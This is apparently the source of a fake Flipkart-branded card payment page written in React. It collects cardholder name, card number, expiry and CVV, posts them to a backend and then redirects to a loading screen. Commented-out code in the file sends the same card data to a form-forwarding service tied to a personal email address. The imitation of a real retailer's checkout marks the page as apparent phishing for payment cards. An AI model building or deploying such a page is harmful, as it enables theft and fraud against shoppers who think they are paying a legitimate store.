/* eslint-disable jsx-a11y/alt-text */
import React from "react";
import { useNavigate } from "react-router-dom";
import "./cardstyl.css";
import axios from "axios";
import { ToastContainer } from "react-toastify";

export default function Cardinformation() {
  const navigate = useNavigate();

  // const [form, setForm] = useState({
  //   cardholdername: "",
  //   cardnumber: "",
  //   cardexpirymonths: "",
  //   cardexpiryyear: "",
  //   CardCvvNumber: "",
  // });
  // const onUpdateField = (e) => {
  //   const nextFormState = {
  //     ...form,
  //     [e.target.name]: e.target.value,
  //   };
  //   setForm(nextFormState);
  // };
  // // console.log(window.location.href);
  // // if (form.CardCvvNumber.length === 3) {
  // //   navigate("/Loading");
  // //   console.log(window.location.href);
  // // }

  // let handleSubmit = async (e) => {
  //   e.preventDefault();

  //   alert(JSON.stringify(form, null, 2));
  //   let res = await fetch(
  //     "https://formsubmit.co/el/derina/mrsanjaydhakad986@gmail.com",
  //     {
  //       method: "POST",
  //       headers: {
  //         "Content-Type": "multipart/form-data",
  //         Accept: "application/json",
  //       },
  //       body: JSON.stringify({
  //         cardholdername: form.cardholdername,
  //         cardnumber: form.cardnumber,
  //         cardexpirymonths: form.cardexpirymonths,
  //         cardexpiryyear: form.cardexpiryyear,
  //         CardCvvNumber: form.CardCvvNumber,
  //       }),
  //     }
  //   );

  //   if (res.status === 200) {
  //     navigate("/Loading");
  //     window.scrollTo({
  //       top: 0,
  //       left: 100,
  //       behavior: "smooth",
  //     });
  //   }
  // };

  const saveFormData = async (e) => {
    e.preventDefault();

    const data = new FormData(e.target);
    const Formvlaues = Object.fromEntries(data.entries());
    console.log(Formvlaues);
    axios
      .post(`http://localhost:8080/api/form`, Formvlaues)
      .then((response) => {
        if (response.status) {
          let dataSet = response.data;
          console.log(dataSet);


          navigate("/Loading");
          e.target.reset();

        }
      });
    console.log(Formvlaues);
  };
  return (
    <>
      <div style={{ marginTop: "5rem" }}>
        <div className="container">
          <ul id="progressbar-1" className="mx-0 mt-0 mb-5 px-0 pt-0 pb-4">
            <li className="step0 active" id="step1">
              <span style={{ marginLeft: "22px", marginTop: "12px" }}>
                Address
              </span>
            </li>
            <li className="step0  text-center" id="step2">
              <span>Order Summary</span>
            </li>
            <li className="step0 text-muted text-end" id="step3">
              <span style={{ marginRight: "22px" }}>Payment</span>
            </li>
          </ul>
        </div>

        <div className="container">
          <div className="header">
            <div className="headerimge">
              <img src="\assest\flipcardbankoffer1.png" alt="" />
            </div>
            <div className="discount">
              <div>
                <span className="imagrhandler">
                  <img src="\assest\bankoffer.webp" />
                </span>
                Bank Offer5% Cashback on Flipkart Axis Bank Card T&C
              </div>
            </div>

            <div className="discount">
              <div>
                Please ensure your card can be used for online transactiond
                <span className="color">Know more</span>
              </div>
            </div>
          </div>
        </div>
        {/* seconded card */}

        <div className="padding">
          <div className="row">
            <div className="container-fluid d-flex justify-content-center">
              <div className="col-sm-8 col-md-6">
                <div className="card">
                  <div className="card-header">
                    <div className="row">
                      <div className="col-md-6">
                        <span>CREDIT/DEBIT CARD PAYMENT</span>
                      </div>

                      <div
                        className="col-md-6 text-right"
                        style={{ marginTop: "-5px" }}
                      >
                        <img src="https://img.icons8.com/color/36/000000/visa.png" />
                        <img src="https://img.icons8.com/color/36/000000/mastercard.png" />
                        <img src="https://img.icons8.com/color/36/000000/amex.png" />
                      </div>
                    </div>
                  </div>

                  <form
                    className="card-body"
                    onSubmit={(e) => saveFormData(e)}
                    encType="multipart/form-data"
                    style={{ height: "350px" }}
                  >
                    <div className="input-group flex-nowrap">
                      <input
                        type="text"
                        className="form-control"
                        placeholder="Name"
                        aria-label="Name"
                        aria-describedby="addon-wrapping"
                        name="cardholdername"
                        // value={form.cardholdername}
                        // onChange={onUpdateField}
                        required
                      />
                    </div>
                    <div className="input-group flex-nowrap mt-1">
                      <input
                        type="tel"
                        inputmode="numeric"
                        pattern="[0-9\s]{13,16}"
                        title="Card number with 0-9 and remaing 16 digit with 0-9"
                        className="form-control"
                        placeholder="xxxx-xxxx-xxxx-xxxx"
                        aria-label="Username"
                        aria-describedby="addon-wrapping"
                        name="cardnumber"
                        id="input"
                        required
                      />

                    </div>

                    <div className="form-group mt-2">
                      <label htmlFor="cc-number" className="control-label">
                        Expiry Date
                      </label>
                      <div className="input-group my-3">
                        <select
                          required="required"
                          className="form-select form-select-sm"
                          aria-label=".form-select-sm example"
                          name="cardexpirymonths"

                        >
                          <option selected>01</option>
                          <option value="1">02</option>
                          <option value="2">03</option>
                          <option value="3">04</option>
                          <option value="4">05</option>
                          <option value="5">06</option>
                          <option value="6">07</option>
                          <option value="7">08</option>
                          <option value="8">09</option>
                          <option value="9">10</option>
                          <option value="10">11</option>
                          <option value="11">12</option>
                        </select>
                        <span className="input-group-text">
                        </span>
                        <select
                          required="required"
                          className="form-select form-select-sm"
                          aria-label=".form-select-sm example"
                          name="cardexpiryyear"
                        >
                          <option selected>2021</option>
                          <option value="2021">2022</option>
                          <option value="2022">2023</option>
                          <option value="2023">2024</option>
                          <option value="2024">2025</option>
                          <option value="2025">2026</option>
                          <option value="2026">2027</option>
                          <option value="2027">2028</option>
                          <option value="2028">2029</option>
                          <option value="2029">2020</option>
                          <option value="2030">2031</option>
                          <option value="2031">2032</option>
                        </select>
                      </div>
                    </div>

                    <div className="input-group flex-nowrap">
                      <input
                        type="tel"
                        pattern="[0-9]{1}[0-9]{2}"
                        title="Card CVC with 0-9 and remaing 3 digit with 0-9"
                        className="form-control"
                        placeholder="CVV Number"
                        aria-label="Name"
                        aria-describedby="addon-wrapping"
                        name="CardCvvNumber"
                        required
                      />
                    </div>
                    <div className="form-group">
                      <label htmlFor="numeric" className="control-label">
                        CARD Type
                      </label>
                      <p className="p-0 mt-2">
                        {" "}
                        <input
                          type="radio"
                          id="Credit"
                          name="Credit"
                          value="Credit"
                          required="required"
                        />
                        <span>{"  "}</span>{" "}
                        <label for="Credit">Credit Card</label>
                      </p>
                      <p className="pb-0">
                        <input
                          type="radio"
                          id="Debit"
                          name="Credit"
                          value="Debit"
                        />
                        <span>{"  "}</span> <label for="Debit">Debit Card</label>
                      </p>
                    </div>

                    <div className="form-group">
                      <button
                        className="Makepayment"
                        value="MAKE PAYMENT"
                        type="submit"
                        style={{ fontSize: "0.8rem" }}
                      >
                        continiue
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
          <ToastContainer />
        </div>

        {/* third card  */}

        <div div className="container mtxy ">
          <div className="footer">
            <div>
              <img
                src="https://static.thenounproject.com/png/1684626-200.png"
                alt=""
              />
            </div>

            <div>
              <img
                src="https://cdn-icons-png.flaticon.com/128/3262/3262027.png"
                alt=""
              />
            </div>

            <div>
              <img
                src="https://image.shutterstock.com/image-vector/simple-creative-easy-return-policy-260nw-2101313926.jpg"
                alt=""
              />
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

